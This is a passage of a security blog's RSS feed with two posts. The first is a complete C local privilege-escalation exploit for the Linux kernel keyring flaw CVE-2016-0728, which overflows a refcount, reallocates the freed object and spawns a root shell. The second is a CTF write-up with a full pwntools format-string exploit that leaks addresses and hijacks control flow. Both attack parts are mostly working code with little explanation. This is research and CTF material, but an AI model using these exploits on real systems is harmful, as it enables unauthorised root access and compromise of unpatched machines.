class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff81094250)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">size_t</span> datalen;</span><br><span class="line">    <span class="keyword">void</span> * vet_description;</span><br><span class="line">    <span class="keyword">void</span> * preparse;</span><br><span class="line">    <span class="keyword">void</span> * free_preparse;</span><br><span class="line">    <span class="keyword">void</span> * instantiate;</span><br><span class="line">    <span class="keyword">void</span> * update;</span><br><span class="line">    <span class="keyword">void</span> * match_preparse;</span><br><span class="line">    <span class="keyword">void</span> * match_free;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">    <span class="keyword">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *keyring_name;</span><br><span class="line"><span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line"><span class="keyword">char</span> mtext[STRUCT_LEN];</span><br><span class="line">&#125; </span><br><span class="line">    msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> msqid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;usage: ./keys &lt;key_name&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid()); </span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    </span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line"></span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)my_key_type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line"></span><br><span class="line">serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line"><span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Increfing...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished increfing&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;forking...&quot;</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished forking&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;caling revoke...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl_revoke&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/70257118/99533180-d2c1cd80-29e8-11eb-9a4d-35319be58303.png" alt="CVE-2016-0728"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f">https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f</a></li><li><a href="https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/">https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/</a></li><li><a href="https://duasynt.com/blog/cve-2016-0728-poc-not-working">https://duasynt.com/blog/cve-2016-0728-poc-not-working</a></li><li><a href="https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/">https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/</a></li><li><a href="http://egloos.zum.com/rousalome/v/9964885">http://egloos.zum.com/rousalome/v/9964885</a></li><li><a href="https://procdiaru.tistory.com/89">https://procdiaru.tistory.com/89</a></li><li><a href="http://blog.naver.com/skinfosec2000/220612669396">http://blog.naver.com/skinfosec2000/220612669396</a></li><li><a href="https://asiagaming.tistory.com/160">https://asiagaming.tistory.com/160</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Linux-Kernel/">Linux Kernel</category>
      
      <category domain="https://pwnkidhn.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/CVE/">CVE</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/11/02/2020-11-03-CVE-2016-0728/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2020 BoB CTF </title>
      <link>https://pwnkidhn.github.io/2020/10/02/2020-10-03-BoB_CTF_2020/</link>
      <guid>https://pwnkidhn.github.io/2020/10/02/2020-10-03-BoB_CTF_2020/</guid>
      <pubDate>Fri, 02 Oct 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2020 BoB CTF Write-up &lt;/center&gt;


&lt;h1 id=&quot;porn-master-pwnable&quot;&gt;&lt;a href=&quot;#porn-master-pwnable&quot; class=&quot;headerlink&quot; title=&quot;porn_master (pwnable)&quot;&gt;&lt;/a&gt;porn_master (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;It is the porn_master on BoB9 CTF.  let’s check protection.&lt;br&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/70257118/91448805-502be500-e8b5-11ea-9e24-98c756b7c800.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;It is full protection. then we should know pie-base and libc-base when we exploit it.&lt;br&gt;let’s see the binary on IDA!&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2020 BoB CTF Write-up </center><h1 id="porn-master-pwnable"><a href="#porn-master-pwnable" class="headerlink" title="porn_master (pwnable)"></a>porn_master (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It is the porn_master on BoB9 CTF.  let’s check protection.<br><img src="https://user-images.githubusercontent.com/70257118/91448805-502be500-e8b5-11ea-9e24-98c756b7c800.png" alt="1"><br>It is full protection. then we should know pie-base and libc-base when we exploit it.<br>let’s see the binary on IDA!</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/70257118/91447645-e0692a80-e8b3-11ea-82af-cd776583bc13.png" alt="image"><br>we can find format string bug on line 28.  but we can only write 0x18 at once to buf.<br>and also we can write two times because of the <code>for loop</code> on line 24.<br>so first time we need to leak pie_addr and libc_addr on stack. then we can get its base_addr.<br>and second time we overwrite <code>printf_ret_addr</code> to <code>printf_addr</code> on  line 21(It is pie_addr).<br>then we jump to line21. we have two opportunities to use format string bug again.<br>according to this, we can make many opportunities, if we overwrite <code>print_ret_addr</code>.<br>we can’t overwrite got because of full relro. so we should overwrite __malloc_hook.<br>let’s overwrite __malloc_hook to oneshot gadget  and get flag!</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;52.79.163.146&#x27;, 12002)</span></span><br><span class="line">p = process(<span class="string">&#x27;./porn_master&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./porn_master&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;lk:%19$p:%17$p:%16$p::&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lk:&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">pie_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libcbase = libc_leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">231</span></span><br><span class="line">piebase = pie_leak - <span class="number">0xa60</span></span><br><span class="line"></span><br><span class="line">printf_ret = stack_leak - <span class="number">0x140</span></span><br><span class="line">main_ret = stack_leak - <span class="number">0xe0</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base : &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&#x27;pie_base : &#x27;</span> + <span class="built_in">hex</span>(piebase))</span><br><span class="line">log.info(<span class="string">&#x27;printf_ret : &#x27;</span> + <span class="built_in">hex</span>(printf_ret))</span><br><span class="line"></span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">oneshot = libcbase + <span class="number">0x4f365</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#log.info(hex(malloc_hook))</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(oneshot))</span><br><span class="line"></span><br><span class="line">printf = piebase + <span class="number">0x97c</span></span><br><span class="line"></span><br><span class="line">low = printf &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p64(printf_ret)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">low_main = oneshot &amp; <span class="number">0xffff</span></span><br><span class="line">high_main = (oneshot &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(low_main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(high_main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low_main)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;CCC&#x27;</span></span><br><span class="line">payload += p64(main_ret)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p64(printf_ret)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(high_main)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;DDD&#x27;</span></span><br><span class="line">payload += p64(main_ret+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="comment">#p.sendafter(&#x27;&gt; &#x27;,&#x27;AAAA&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Write-up/">Write-up</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/10/02/2020-10-03-BoB_CTF_2020/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
